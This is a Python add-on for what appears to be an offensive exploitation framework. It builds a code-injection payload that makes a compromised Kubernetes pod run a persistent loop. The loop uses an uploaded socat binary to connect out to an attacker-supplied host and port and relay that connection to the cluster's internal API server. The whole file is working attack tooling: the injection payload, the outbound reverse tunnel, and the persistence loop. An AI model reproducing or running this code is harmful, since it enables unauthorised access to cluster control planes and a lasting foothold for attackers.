def run(exploit, params=None):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    
    if not params or len(params) < 2:
        print(f" {R}!!{N} Usage: --addon proxy <LHOST> <LPORT>")
        return

    lhost, lport = params[0], params[1]
    
    # We use /tmp/socat assuming it was uploaded there by your upload script
    socat_path = "/tmp/socat"
    
    print(f"\n{B}[ K8S EXPLOIT: PERSISTENT SOCAT BRIDGE ]{N}")
    print(f" {G}●{N} Local Entry: {Y}127.0.0.1:4443{N}")
    print(f" {G}●{N} Reverse Tunnel: {C}{lhost}:{lport}{N} <-> {Y}K8s API{N}")

    # THE PERSISTENCE LOOP:
    # 1. 'while true' ensures the tunnel restarts after every kubectl command.
    # 2. Uses the Service Host/Port variables for DNS reliability.
    # 3. Synchronous execution via os.system.
    socat_persistent_cmd = (
        f"while true; do "
        f"{socat_path} TCP4:{lhost}:{int(lport)} TCP4:$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT; "
        f"sleep 0.2; "
        f"done"
    )

    payload = f"(lambda i: i('os').system(\"{socat_persistent_cmd}\"))(__import__)"

    print(f" {Y}[*] Dispatching persistent socat loop...{N}")
    print(f" {G}●{N} {M}Note:{N} Ensure your local listener has the {Y},fork{N} option.")
    
    try:
        # This will block and keep the session active on the pod
        exploit.execute(payload)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Bridge stopped locally.{N}")

    print(f"\n{B}[ Operation Complete ]{N}\n")